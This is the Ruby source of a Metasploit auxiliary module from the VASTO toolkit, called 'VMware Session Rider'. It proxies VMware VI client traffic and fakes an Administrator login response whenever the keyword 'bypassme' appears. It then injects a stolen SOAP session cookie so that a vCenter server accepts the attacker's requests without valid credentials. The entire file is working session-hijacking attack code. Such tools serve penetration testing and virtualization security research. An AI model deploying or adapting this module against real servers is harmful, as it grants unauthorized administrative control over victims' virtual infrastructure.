#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report
	include Rex::FileUtils
	include Msf::Exploit::Remote::HttpClient
	include Rex::Socket::SslTcp
	
	
	 def initialize
		super(
			'Name'        => 'VMware Session Rider',
			'Version'     => '0.1',
			'Description'    => %q{
			This module will allow the injection of a given SOAP Session ID
			and usage with the VI client. Use bypassme as username or password to activate.
			},
			'Author'      => ['Claudio Criscione'],
			'License'     => GPL_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 9999 ]),
				OptPort.new('RPORT',    [ false, "The remote port.", 443 ]),
				OptString.new('RHOST',    [ false, "The remote host.", "172.16.73.150" ]),
       				OptString.new('SOAPID',    [ false, "The SOAP session ID to use to authenticate.", "04D40C81-564E-4511-AC0D-D57FFA571E4E" ]),
		                OptBool.new('SSL', [ true, "Use SSL", true ]),
			], self.class)
	end

	def run
		@myhost   = datastore['SRVHOST']
		@payload  = datastore['PAYLOAD']
		@RHOST = datastore['RHOST']
		@RPORT = datastore['RPORT']
		@myport = datastore['SRVPORT']
		@STOLENSOAPID = datastore['SOAPID']
		puts("SOAPID #{@STOLENSOAPID}")
		@firstreq = true #This is a flag to track wheter we have provided the authentication or not
		@loggedin = false #This is a flag to track if we have already gone through login
		exploit()	
	end
	
	
	def on_client_connect(c)		
		c.extend(Rex::Proto::Http::ServerClient)
		c.init_cli(self)
	end
	
	def on_client_data(cli)
		begin
			data = cli.get_once(-1, 5)
			raise ::Errno::ECONNABORTED if !data or data.length == 0
			case cli.request.parse(data)
				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)
					cli.reset_cli
				when  Rex::Proto::Http::Packet::ParseCode::Error
					close_client(cli)
			end
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::OpenSSL::SSL::SSLError
		rescue ::Exception
			print_status("VMware Session Rider - Error: #{$!.class} #{$!} #{$!.backtrace}")
		end
	end

	def close_client(cli)
		cli.close
		# Required to clean up the service properly
		raise ::EOFError
	end
	
	
	def dispatch_request(cli, req)	
		phost = cli.peerhost
		mysrc = Rex::Socket.source_address(cli.peerhost)
		hhead = (req['Host'] || @myhost).split(':', 2)[0]
		
		@body = req.body		
		@ans = ""
		
		#Here we handle GET requests
		if(req.method == "GET")
		  res = send_request_raw( { 'uri'     => req.resource})
		  @ans  = 
			"HTTP/1.1 200 OK\r\n" +
			"Host: #{mysrc}\r\n" +
			"Expires: 0\r\n" +
			"Content-Type: text/xml\r\n" +
			"Content-Length: #{res.body.length}\r\n" +
			"\r\n#{res.body}"
		    cli.put(@ans)
		else
		  if(@firstreq) #This is the first request so we acquire a SOAPID from the server
		    #This is necessary because the VCenter will not let us use the stolen SOAPID pre-auth
		    print_status("VMware Session Rider - Executing first request to retrieve SOAPID")
		    res = send_request_raw( {
			      'uri'     => req.resource,
			      'method'  => req.method,
			      'vhost'   => @RHOST,
			      'data'    => req.body,
		              'read_max_data' => (1024*1024*10),
			      'headers' => {
				      'User-Agent'      => 'VMware VI Client',
				      'Content-Length'  => req.body.length,
				      'SOAPAction'      => "\"#{req.headers['SOAPAction']}\"",
				      'Expect'          => '100-continue',
				      'Content-Type'    => 'text/xml; charset=\"UTF-8\"',
			      }
		    }, -1)
		    @ans  = 
			  "HTTP/1.1 200 OK\r\n" +
			  "Host: #{mysrc}:#{@myport}\r\n" +
			  "Cache-Control: no-cache\r\n" +
			  "Content-Type: text/xml\r\n" +
			  "Set-Cookie: #{res.headers['Set-Cookie']}\r\n" + 
			  "Content-Length: #{res.body.length}\r\n" +
			  "\r\n#{res.body}"
		    @firstreq = false #ok, we have got the soapid now
		    cli.put(@ans)
		  else #This is not the first request, so we handle it 
		    if(@loggedin) #If we are logged in we can start using the stolensoapid!
			@currentsoapid = "vmware_soap_session=#{@STOLENSOAPID};"
		    else
			@currentsoapid = req.headers['Cookie']
		    end
		    puts("Request: #{@currentsoapid}");
		    
		    if(req.body.match(/bypassme/)) then #Performing fake login, so we don't need valid credentials!
		      print_status("Keyword bypassme found in stream with . Executing fake login now!")
		      fakeanswer = '<?xml version="1.0" encoding="UTF-8"?>'+
		      '<soapenv:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" '+
		      'xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '+
		      'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '+
		      'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> '+
		      '<soapenv:Body>'+
		      '<LoginResponse xmlns="urn:internalvim25"><returnval><key>605E3B6C-8832-4DDD-A1AE-68753C1412BB</key><userName>Administrator</userName><fullName></fullName><loginTime>2010-06-19T08:38:18.263415Z</loginTime><lastActiveTime>2010-06-19T08:38:18.263415Z</lastActiveTime><locale>en_US</locale><messageLocale>en</messageLocale></returnval></LoginResponse>'+
		      '</soapenv:Body>'+
		      '</soapenv:Envelope>'
		      @ans  = 
			    "HTTP/1.1 200 OK\r\n" +
			    "Host: #{mysrc}:#{@myport}\r\n" +
			    "Cache-Control: no-cache\r\n" +
			    "Content-Type: text/xml\r\n" +
			    "Content-Length: #{fakeanswer.length}\r\n" +
			    "\r\n#{fakeanswer}"
		      @loggedin = true
		      cli.put(@ans)
		    else 		    		
		      @datareq = req.body #We turn as-is what the client requests
		      
		      request = "POST /sdk HTTP/1.1\r\n"+
		      "Host: #{@RHOST}:#{@RPORT}\r\n"+
		      "User-Agent: VMware VI Client/4.0.0\r\n"+
		      "SOAPAction: #{req.headers['SOAPAction']}\r\n"+
		      "Content-Length: #{@datareq.length}\r\n"+
		      "Content-Type : text/xml; charset=\"UTF-8\"\r\n"+
		      "Cookie: #{@currentsoapid}\r\n\r\n#{@datareq}"
		      
		      #We use sockets here due to some size issues with the SSL HTTP meshup
		      socket_to_vcenter = Rex::Socket::SslTcp.create(
				'PeerHost' => @RHOST,
				'PeerPort' => @RPORT)
		      begin 
			timeout(3) do
			socket_to_vcenter.put(request) #We submit the request
			res_with_headers = socket_to_vcenter.get() #We get the answer
			#We now have to extract the body from the headers
			@ans = res_with_headers
			socket_to_vcenter.close
			cli.put(@ans)
			close_client(cli)
		      end
		      rescue Timeout::Error
			#Timeouts will happen if there are no updates
			close_client(cli)
			socket_to_vcenter.close
		      end
		    end
		  end
		end
	      return		
	end	
end